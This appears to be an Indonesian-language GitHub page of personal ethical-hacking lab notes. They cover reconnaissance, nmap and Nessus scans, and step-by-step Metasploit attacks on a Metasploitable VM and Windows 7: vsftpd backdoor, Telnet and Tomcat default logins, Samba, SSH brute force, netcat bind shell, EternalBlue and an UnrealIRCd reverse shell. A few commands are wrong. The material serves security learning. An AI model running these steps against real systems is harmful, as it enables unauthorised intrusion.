## Information Gathering Methods:

```sh
  whois domain_name
  ```
- Gunakan whois untuk mendapatkan informasi domain dengan memasukkan nama domain
```sh
  whatweb -v domain_name
  ```
- Gunakan whatweb dengan opsi -v untuk mendapatkan informasi web secara rinci

<br>
<br>

## IP Scanning
```sh
  nslookup google.com
  ```
- Gunakan nslookup untuk mendapatkan informasi IP terkait dengan nama domain google.com
```sh
  ping  google.com -4
  ```
- Gunakan ping dengan opsi -4 untuk melakukan pengujian konektivitas ke alamat IP IPv4 dari google.com

<br>
<br>

## Saving Log Data Web:
```sh
  whatweb domain_name -v --log-file=namafile
  ```
<br>
<br>

## Email Hunter Methods
- theHarvester
```sh
theHarvester -d domain_name -b all
  ```
- [Hunter.io](https://hunter.io/)


<br>
<br>

## Sherlock (Username Hunter)
```sh
cd /Users/naufalazhar/Documents/NAUFAL_AZHAR/HACKING/Hacking_tools/sherlock/sherlock
  ```
```sh
python3 sherlock.py username
  ```
<br>
<br>

## NMAP Scanning
### IP Range Scan & List Scan:
 ```sh
  sudo netdiscover -r ip_address
  ```
- Gunakan sudo netdiscover untuk melakukan pemindaian rentang dengan IP yang ditentukan
 ```sh
nmap -Pn ip_address
  ```
- Gunakan nmap dengan opsi -Pn untuk melakukan pemindaian daftar pada alamat IP target yang ditentukan
- Catatan: Gunakan ini jika Windows memblokir permintaan ping
 ```sh
nmap -iL file_name
  ```
  - Gunakan nmap dengan opsi -iL untuk melakukan pemindaian pada beberapa IP yang ditentukan dalam file yang diberikan
  - Contoh: nmap -iL targets.txt
```sh
nmap ip_address 0/24
  ```
<br>

### Syn Scan, TCP Connect Scan, UDP Scan:
- Syn scan
```sh
sudo nmap -sS ip_address_target
  ```
- TCP connect scan
```sh
sudo nmap -sT ip_address_target
  ```
<br>

### OS Detection Scanning (nmap):
```sh
sudo nmap -O ip_address_target
  ```
<br>

### Port Service Version Scanning (nmap):
```sh
sudo nmap -sV ip_address_target
  ```
- Lower intensity
```sh
sudo nmap -sV  —version-intensity 2 ip_address_target
  ```
```sh
sudo nmap -sV --version-all ip_address_target
  ```
- Lower intensity 
```sh
sudo nmap -sV --version-light ip_address_target
  ```
<br>
<br>

### Aggressive Scan (not recommended, too much noise):
```sh
sudo nmap -A ip_address_target
  ```
<br>

### Port Specification & Output Handling:
- select ports
```sh
sudo nmap -sS -p port1,port2,... ip_address_target
  ```
- all ports
```sh
sudo nmap -sS -p- ip_address_target
  ```
- top 100 ports
```sh
sudo nmap -sS -F ip_address_target
  ```
- save output logs
```sh
sudo nmap -sS -F ip_address_target >> nama_file.txt
  ```
- save log dan menampilkan output 
```sh
sudo nmap -sS -F -oN nama_file ip_address_target
  ```
- Lower intensity 
```sh
sudo nmap -sV  —version-intensity 2 ip_address_target
  ```

<br>
================================================================================================

## Vulnerability SECTION

### Vulnerability Analysis with Nmap (Group Scripts):
[Usage and Examples](https://nmap.org/book/nse-usage.html)

 ```sh
  sudo nmap --script auth ip_address_target -sS
  ```
- Perintah sudo nmap --script auth ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi otentikasi dan keamanan. Opsi -sS menunjukkan penggunaan pemindaian TCP SYN (half-open scan), sementara --script auth memaksa Nmap menggunakan skrip khusus untuk mengidentifikasi masalah otentikasi pada sistem target.

  - <img width="550" alt="Screenshot 2023-12-21 at 16 51 13" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/726c79c1-9e3c-4a6d-9888-2de0a56379b9">
  
Pada alamat IP 192.168.1.4, Nmap menemukan bahwa kredensial tomcat:tomcat adalah valid dan dapat digunakan untuk mengakses server web Apache Tomcat.

1. untuk mengakses server web Apache Tomcat masuk ke alamat contoh: `192.168.1.4:8081`
  - <img width="450" alt="Screenshot 2023-12-24 at 02 23 24" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/37f5af59-a770-4bf0-9afa-f35268c02930">
2. dan coba login menggunakan username: `tomcat` dan password: `tomcat`.
  - <img width="450" alt="Screenshot 2023-12-24 at 02 28 13" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/07569465-5632-4532-baab-5ed03a5b734a">


<br>
<br>
  
```sh
  sudo nmap --script malware ip_address_target -sS
  ```
- Perintah sudo nmap --script malware ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi potensi malware.
 - <img width="550" alt="Screenshot 2023-12-21 at 16 55 31" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/3bd1b010-cdd3-4f0a-ac25-7261ffcff751">
<br>
<br>


```sh
  sudo nmap --script banner ip_address_target -sS
  ```
- Perintah sudo nmap --script banner ip_address_target -sS digunakan untuk melakukan pemindaian jaringan pada alamat IP tertentu dengan fokus pada deteksi dan pengekspos banner atau informasi servis pada port tertentu.
 - <img width="550" alt="Screenshot 2023-12-21 at 17 29 44" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/46786610-5ba4-41b8-9167-b85385e0a745">
<br>
<br>

### Vulnerability Analysis with Nmap (Single Scripts):
```sh
  cd /usr/share/nmap/scripts
  ```

  ```sh
  sudo nmap --script-help Vulnerability
  ```
- Access target through anonymous FTP if vulnerable:
  
  ```sh
  sudo nmap --script ftp-anon.nse ip_address -sS
  ```
   - <img width="537" alt="Screenshot 2023-12-21 at 17 45 17" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/ac186912-f06e-4389-8ab4-ad51ef13d24f">

<br>

================================================================================================

## Via NESSUS
### INSTALLATIONS
1. [Nessus Download](https://www.tenable.com/downloads/nessus?loginAttempted=true)
2. Select your version
3. Download.
4. cd (file download directory)
5. `sudo dpkg -i Nessus-10.6.4-debian10_amd64.deb`
6. You can `start` Nessus Scanner by typing `sudo /bin/systemctl start nessusd.service`
7. You can `stop` Nessus Scanner by typing `sudo /bin/systemctl stop nessusd.service`
8. Access Nessus: https://kali:8834/

### EXAMPLE :
- <img width="550" alt="Screenshot 2023-12-22 at 14 14 49" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/8746ad5d-1e99-4be6-99af-2a36c6524153">


<br>
<br>

================================================================================================

## EXPLOITS SECTION `Metasploit Framework`
### To view Metasploit location in Linux:

```sh
  cd /usr/share/metasploit-framework
  ```
```sh
  cd /usr/share/metasploit-framework/modules
  ```
### Modules :
- `exploits`
    - Modul ini digunakan untuk mengeksploitasi kerentanan keamanan pada suatu sistem.
    - Contoh: `exploit/windows/smb/ms08_067_netapi`
      
- `nops`
    - Nops (No Operations) adalah instruksi atau serangkaian instruksi yang tidak melakukan operasi apapun. Modul ini digunakan untuk memasukkan nops sled di antara payload dan shellcode.
    - Contoh: `nops/linux/x86/mov`
      
- `payloads`
    - Payload adalah kode yang dieksekusi setelah eksploitasi berhasil. Modul payload menentukan apa yang akan dilakukan setelah keberhasilan eksploitasi.
    - Contoh: `windows/meterpreter/reverse_tcp`
      
- `post`
    - Modul ini digunakan setelah berhasil melakukan eksploitasi untuk mengekstrak informasi tambahan dari sistem target.
    - Contoh: `post/windows/gather/enum_logged_on_users`

- `encoders`
    - Modul ini digunakan untuk mengubah payload sehingga dapat menghindari deteksi oleh perangkat lunak keamanan.
    - Contoh: `encoder/x86/alpha_mixed`
- `evasion`
    - Modul ini membantu dalam menghindari deteksi oleh alat keamanan dan perangkat lunak antivirus.
    - Contoh: `evasion/windows/disable_defender`

- `auxiliary`
    - Modul ini memberikan fungsionalitas tambahan yang dapat membantu dalam pengumpulan informasi, pemindaian, atau eksploitasi non-invasif.
    - Contoh: `auxiliary/scanner/http/http_version`

<br>

================================================================================================

## STEP BY STEP EXPLOITATION `vsftpd 2.3.4` Metasploit-framework
Langkah-langkah ini secara umum mencakup pencarian kelemahan (vulnerabilities) pada sistem target dan eksploitasi kelemahan tersebut menggunakan alat seperti Metasploit Framework. Metode ini umumnya digunakan oleh peneliti keamanan atau profesional keamanan informasi untuk mengidentifikasi dan memperbaiki kelemahan yang mungkin dapat dieksploitasi oleh penyerang. Ini penting dalam memastikan bahwa sistem dan jaringan memiliki tingkat keamanan yang tinggi terhadap potensi ancaman.

1. Temukan port terbuka pada target menggunakan nmap `sudo nmap -sV ip_address_target`.
    - sebagai contoh disini saya akan mencoba mengekspolit port 21 yaitu `vsFTPd 2.3.4`
2. Untuk melihat exploit apa yang dapat digunakan untuk mengeksploitasi `vsFTPd`, gunakan perintah `searchsploit vsftpd 2.3.4`.
   - <img width="450" alt="Screenshot 2023-12-22 at 12 32 05" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/2872fcef-a89c-44f4-8a81-292c6ef67e0f">

3. Selanjutnya, buka `MSFCONSOLE` untuk membuka Metasploit.
    - <img width="350" alt="Screenshot 2023-12-22 at 17 50 47" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/54695667-4e87-4ec2-9974-1ef268c5e864">

4. Cari exploit yang dapat digunakan untuk mengeksploitasi `vsFTPd` menggunakan perintah `search vsftpd 2.3.4`.
    - <img width="450" alt="Screenshot 2023-12-22 at 17 59 37" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/b5ee22e7-a81d-444b-8dd2-865126699078">

5. Cara menggunakan exploit adalah dengan menggunakan perintah `use 0` (bisa menggunakan nomor di depan).
   - <img width="490" alt="Screenshot 2023-12-22 at 18 06 38" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/9b6ba305-5bb1-4afa-b70c-70d894ab760b">

6. Cara mengetahui informasi tentang exploit yang baru digunakan adalah dengan menggunakan perintah `show info`.
   - <img width="450" alt="Screenshot 2023-12-22 at 18 09 52" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/58916478-3864-439f-bb11-022735a7dd0e">

7. Jika `RHOST` masih kosong, kita harus mengisinya.
8. Cara memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
    - <img width="450" alt="Screenshot 2023-12-22 at 18 13 54" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/944e24ed-ad09-42fb-81a7-d5d6c4f673f6">

9. Untuk memastikan apakah sudah terisi atau belum, gunakan perintah `SHOW OPTIONS`.
10. Cara mengeksploitasi mesin target adalah dengan menggunakan perintah `EXPLOIT` / `RUN`.
    - <img width="450" alt="Screenshot 2023-12-22 at 18 18 23" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/4e88b2fd-4576-440f-987c-bc7a2ec1323a">

11. Untuk keluar, gunakan perintah `EXIT`.

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `Telnet`

Eksploitasi pada port 23, yang merupakan port standar untuk layanan Telnet, dapat berbahaya karena Telnet mengirim informasi, termasuk kata sandi, dalam bentuk teks biasa tanpa enkripsi. Telnet adalah protokol lama dan tidak aman yang digunakan untuk mengakses dan mengelola perangkat jarak jauh. Seiring waktu, Telnet telah digantikan oleh protokol yang lebih aman seperti SSH.

1. Gunakan perintah `telnet ip_address`
  - <img width="450" alt="Screenshot 2023-12-22 at 19 51 09" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6e78f2b2-7374-405e-a723-2dc49fb059c3">

2. Login menggunakan `msfadmin` dan password: `msfadmin`
3. kini kita sudah berhasil mengeksploit dan masuk ke target mesin
  - <img width="450" alt="Screenshot 2023-12-22 at 19 54 24" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/4fdae79f-5a3c-403b-9117-8f5377676763">
4. Untuk masuk sebagai `root` gunakan perintah `sudo su`, jika meminta password, passwordnya adalah `msfadmin`.

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `Samba samb 3.X 4.X`

1. di bagian ini saya akan menggunakan `Scanner` untuk menegetahui versi dari service tersebut.
2. cd ke `/usr/share/metasploit-framework/modules/auxiliary/scanner/smb` untuk menggunakan `smb_version.rb`.
3. selanjutnya gunakan perintah `msfconsole` untuk membuka metasploit.
4. gunakan perintah `use auxiliary/scanner/smb/` tekan `enter`.
5. pilih `smb_version` dengan menggunakan perintah `use 12`.
6. untuk mengetahui informasi tentang exploit yang baru digunakan adalah dengan menggunakan perintah `show info`.
7. untuk memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
8. gunakan perintah `run` untuk menggunakan Scanner dan untuk melihat hasil dari scannernya.
9. dan versi dari samba tersebut ada lah `Samba 3.0.20`
  - <img width="450" alt="Screenshot 2023-12-22 at 20 40 49" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f213a32a-1143-4e41-a83f-8018bcfbe97a">
10. untuk mencari exploitnya gunakan perintah `searchsploit samba 3.0.20`.
11. buka metasploit gunakan perintah `msfconsole`.
12. cari exploit `samba 3.0.2` gunakan perintah `search samba 3.0.20`.
13. dan pilih exploit tersebut gunakan perintah `use 0`.
14. untuk melihat semua `options` nya gunakan perintah `show options`
15. Cara memasukkan `RHOST (IP TARGET)` adalah dengan menggunakan perintah `set RHOSTS ip_addres_target`.
16. Cara mengeksploitasi mesin target adalah dengan menggunakan perintah `EXPLOIT` / `RUN`.

<br>
================================================================================================

## SSH `Bruteforce Attack` with Crunch & Metasploit

SSH Bruteforce Attack adalah serangan keamanan yang dilakukan dengan mencoba berbagai kombinasi kata sandi untuk mendapatkan akses tidak sah ke sistem atau perangkat yang menggunakan protokol SSH (Secure Shell). SSH digunakan untuk mengakses dan mengelola perangkat jarak jauh secara aman.

Untuk melakukan Bruteforce Attack kita membutuhkan sebuah `shell` yang bisa kita gunakan untuk login yang memiliki username dan password
  - <img width="598" alt="Screenshot 2023-12-23 at 10 25 08" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/ee54144b-ff08-4b73-903a-52959304c6af">
disini saya menggunakan `VM metasploitable` untuk mempraktikannya, seperti yang kita lihat pada gambar diatas terdapat vulnerable pada `port 22` yaitu service `SSH` version `openSSH 4.7p1 xxxx`,
`SSH` ini adalah singkatan dari `SECURE SOCKET SHELL` yang kita gunakan untuk sistem admininistrator, artinya kita bisa login ke komputer menggunakan `username` dan `password` melalui SSH, dan SSH ini juga kita bisa gunakan untuk `Remote Access` kita bisa login dari komputer ke komputer lain.

Sebelum melakukan `Bruteforce Attack`, terlebih dahulu kita perlu membuat sebuah daftar kata yang panjang, dan memiliki kata kombinasi daro A sampai Z, dan untuk melakukan Brutefoce Attack akan memakan waktu yang sangat lama, (tergantung dari spek device yang kita miliki).
 msid
disni saya menggubakan `Crunch` untuk membuat daftar kata yang akan kita gunakan untuk Bruteforce Attack.
<br>

### STEP BY STEP

1. untuk men generate daftar kata mengguakan `Crunch` gunakan perintah :
   - sebagai contoh disini saya menggunakan daftar kata yang sederhana untuk mempersingkat waktu praktik.
   - `8 8`: Parameter ini menunjukkan panjang minimum dan maksimum dari kata sandi yang akan dihasilkan. Dalam contoh ini, panjang kata sandi adalah 8 karakter.
   - `msidfna`: Parameter ini menyediakan karakter yang akan digunakan untuk menghasilkan kata sandi. Dalam hal ini, karakter "msidfna" akan digunakan untuk membuat kombinasi kata sandi.
   - `-o username.txt`: Parameter ini menentukan bahwa output dari daftar kata sandi yang dihasilkan akan disimpan dalam file bernama "username.txt."
```sh
  crunch 8 8 msidfna -o username.txt
  ```
  - <img width="450" alt="Screenshot 2023-12-23 at 11 14 27" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/38178daa-131b-48bd-b7f6-7951f12d937c">

2. selanjtutnya kita akan menggunakan modul dari metasploit yaitu `auxiliary`
3. cd ke `/usr/share/metasploit-framework/modules/auxiliary/` untuk melihat modul dari auxiliary.
4. disini kita akan menggunakan `SSH Scanner`, cd ke `scanner/ssh`.
  - <img width="450" alt="Screenshot 2023-12-23 at 11 46 39" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f6558080-b479-44b7-9040-c6e104464c93">
5. kita akan gunakan file `ssh_login.rb` untuk melakukan Bruteforce Attack.
6. buka metasploit, gunakam perintah `msfconsole`.
7. gunakan perintah `use auxiliary/scanner/ssh/`.
8. pilih file `shh_login.rb`, gunakan perintah `use 12`.
9. gunakan perintah `show options` untuk melihat apa saja yang harus wajib di isi.
  - <img width="450" alt="Screenshot 2023-12-23 at 12 02 43" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6e28d51b-21ac-439d-b77b-b34b2ef234a4">
10. untuk set RHOSTs gunakan perintah `set RHOSTS ip_address`.
11. terlebih dahulu buat file `password.txt`, tinggal copy saja file `username.txt`, dan ubah namanya menjadi password.txt.
12. untuk PASS_FILE gunakan perintah `set PASS_FILE ../../password.txt`.
13. untuk USER_FILE gunakan perintah `set PASS_FILE ../../username.txt`.
14. untuk menjalankan Brutefroce Attack ini gunakan perintah `run`.
15. jika sudah menemukan username dan password yang cocok, tekan CTRL+C saja untuk `stop` Bruteforce.
  - <img width="650" alt="Screenshot 2023-12-23 at 12 29 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/2cb2f568-89a5-4668-bacd-6fe4b54d8496">
  - tetapi disini kita belum berada didalam shell metasploitable, cara masuk shellnya yaitu menggunakan session yang terbuka.
16. gunakan perintah `sessions`.
  - <img width="450" alt="Screenshot 2023-12-23 at 12 34 58" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/80efedab-0362-4e7b-9b12-0759f7991573">
17. untuk menggunakan session tersebut yaitu gunakan perintah `sessions -i 1`
  - <img width="520" alt="Screenshot 2023-12-23 at 12 37 52" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/79962c33-f21e-4cd8-b83d-df66ebb3546c">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `VNC SERVER`

Port 5900 adalah port default yang digunakan oleh Virtual Network Computing (VNC) untuk menyediakan layanan akses jarak jauh. VNC memungkinkan pengguna untuk mengendalikan dan melihat desktop dari jarak jauh. Port 5900 khususnya digunakan untuk protokol VNC versi 3.3. Jika protokol yang digunakan adalah versi lain, port yang digunakan bisa berbeda (misalnya, 5901 untuk VNC versi 3.4).

Exploitasi pada port 5900 VNC (Protocol 3.3) dapat terjadi jika ada kerentanan keamanan yang dapat dimanfaatkan oleh penyerang. Beberapa potensi kerentanan atau skenario eksploitasi yang dapat terjadi adalah:

  - Kelemahan kata sandi:
      - Penggunaan kata sandi yang lemah atau mudah ditebak pada server VNC dapat memudahkan penyerang untuk mendapatkan akses yang tidak sah.
        
  - Bruteforce Attack:
      - Seseorang dapat mencoba untuk menjebol kata sandi VNC dengan melakukan serangan bruteforce pada port 5900, mencoba berbagai kombinasi kata sandi.

1. untuk mengakses `VNC SERVER` ini kita bisa menggunakan perintah:
  
      ```sh
      vncviewer ip_address
      ```
2. dan masukan `password`
   
    - <img width="773" alt="Screenshot 2023-12-23 at 13 29 44" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/bcf14cb2-966e-4619-b687-f0f37ffcd92f">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `Bind Shell Backdoor` with Netcat

Port 1524 adalah port yang seringkali dikaitkan dengan "Bindshell." Bindshell adalah jenis backdoor atau pintu belakang yang dapat memberikan akses ke sistem dari jarak jauh tanpa pengetahuan atau izin pemilik sistem. Penyebutan "Bindshell" berasal dari kemampuannya untuk "melekat" atau "bind" pada port tertentu pada sistem yang terinfeksi.

Exploitasi pada port 1524 dengan layanan Bindshell dapat terjadi jika ada keamanan yang rentan atau ada celah yang dapat dimanfaatkan oleh penyerang. Beberapa potensi kerentanan atau skenario eksploitasi yang dapat terjadi melalui Bindshell pada port 1524 termasuk:

  - Eksploitasi Kerentanan Sistem Operasi:
      - Bindshell dapat dimanfaatkan untuk mengeksploitasi kerentanan pada sistem operasi yang dijalankan oleh target. Hal ini dapat melibatkan celah keamanan atau kerentanan tertentu yang dapat memberikan akses ke root atau hak istimewa tinggi lainnya.
        
  - Pemasangan Backdoor:
      - Setelah berhasil dieksploitasi, Bindshell dapat digunakan untuk menginstal backdoor pada sistem target. Backdoor ini kemudian dapat digunakan oleh penyerang untuk memasuki sistem kapan saja tanpa pengetahuan pemilik sistem.

1. untuk mengakses `Bindshell` bisa menggunakan tools yaitu `Netcat`.
2. gunakan perintah:
   
      ```sh
      netcat (ip_address) (port)
      ```

  - <img width="461" alt="Screenshot 2023-12-23 at 13 53 56" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/e32f7cb1-8bb6-4eb9-be2c-09bc8a6acd3e">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `EternalBlue Attack` (Windows) (Metasploit-framework)

EternalBlue adalah sebuah exploit (kode yang memanfaatkan kelemahan di dalam perangkat lunak) yang terkait dengan kerentanan keamanan bernama CVE-2017-0144. Kerentanan ini ada di dalam implementasi protokol Server Message Block (SMB) di sistem operasi Microsoft Windows. SMB digunakan untuk berbagi file dan printer di jaringan, dan kelemahan ini memungkinkan penyerang untuk mengeksekusi kode arbitrer di sistem target tanpa otorisasi.

EternalBlue menjadi terkenal karena menjadi salah satu komponen utama dalam serangan ransomware WannaCry yang menyebar dengan cepat pada tahun 2017, mempengaruhi ribuan komputer di seluruh dunia.

Berikut cara mengeksploit Windows 7 dengan `EternalBlue`:

1. buka Metasploit, gunakan perintah `msfconsole`.
2. cari exploit `EternalBlue`, gunakan perintah `search eternalblue`
  - <img width="450" alt="Screenshot 2023-12-23 at 15 07 22" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/f875269a-c78a-46b6-a45c-33370f33250d">
3. terlebih dahulu kita akan menggunakan `Scanner` di module metasploit untuk mengetahui apakah windows 7 vulnerable terhadap `EternalBlue Attack` atau tidak.
4. gunakan perintah `use 3`.
5. untuk melihat optionsnya gunakan perintah `show options`.
6. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
7. dan untuk menjalankannya gunakan perintah `run`.
8. berikut hasil scannya:
   - `HOST is Likely VULNERABLE to MS17-010!` itu artinya windows 7 vulnerable terhadap serangan `EternalBlue`.
- <img width="1325" alt="Screenshot 2023-12-23 at 15 14 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/9dac0792-c02c-43b9-a068-5b595a77ae24">
9. selanjutnya cari exploit `EternalBlue`, gunakan perintah `search eternalblue`.
10. pilih `exploit/windows/smb/ms17_010_eternalblue` gunakan perintah `use 0`.
11. untuk melihat optionsnya gunakan perintah `show options`.
12. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
13. dan untuk menjalankannya gunakan perintah `run`.
  - <img width="450" alt="Screenshot 2023-12-23 at 15 24 01" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/5deae0fd-351f-4434-af8c-856e131acb6d">

<br>
================================================================================================

## STEP BY STEP EXPLOITATION `UnrealIRCd` 

Port 6667 adalah port yang umumnya digunakan untuk layanan Internet Relay Chat (IRC), yang digunakan untuk berkomunikasi dalam real-time melalui berbagai saluran (channels) di internet. IRC adalah protokol komunikasi yang sudah lama ada dan umumnya digunakan untuk obrolan grup dan diskusi topik tertentu.

  - Eksploitasi Kerentanan Keamanan:
      - Jika ada kerentanan keamanan yang ditemukan dalam versi tertentu dari UnrealIRCd, penyerang dapat mencoba menggunakan exploit untuk mendapatkan akses yang tidak sah ke server
  - <img width="399" alt="Screenshot 2023-12-24 at 12 35 51" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/0acf7b1e-b958-457a-9e8d-95169f74997c">

1. terlebih dahulu cari exploit mana yang akan kita gunakan, yaitu gunakan perintah `searchsploit unrealircd`.
  - <img width="728" alt="Screenshot 2023-12-24 at 12 40 45" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/218586ed-27d5-4da2-91ba-8aa2f9547f54">
2. dan dsini kita akan gunakan exploit dari modul metasploit framework.
3. untuk membuka metasploit gunakan perintah `msfconsole`.
4. cari exploit `UnrealIRCd`, gunakan perintah `search unrealircd`.
  - <img width="450" alt="Screenshot 2023-12-24 at 12 45 41" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/35a6fe2f-ed86-4285-9a09-46565373ceb1">
5. gunakan exploit tersebut, gunakan perintah `use 0`.
6. untuk melihat optionsnya gunakan perintah `show options`.
7. untuk mengisi RHOSTS gunakan perintah `set RHOSTS ip_addres`.
8. untuk mengisi `payloads` (jika dibutuhkan), gunakan perintah `show payloads`.
  - <img width="450" alt="Screenshot 2023-12-24 at 12 51 11" src="https://github.com/naufalazhar65/ETHICAL-HACKING-DOCS/assets/123730742/6c765752-e6da-474f-8adc-cb559d319deb">
9. gunakan payloads `Reverse TCP (Telnet)`, gunakan perintah `set payload 5`.
    - catatan: jika kita mengunakan payload `Reverse TCP (Telnet)` kita harus mengisi `LHOST` yaitu ip address dari Kali Linux kita.
10. untuk mengisi LHOST gunakan perintah `set LHOST ip_addres`.
11. dan untuk menjalankannya gunakan perintah `run`.


















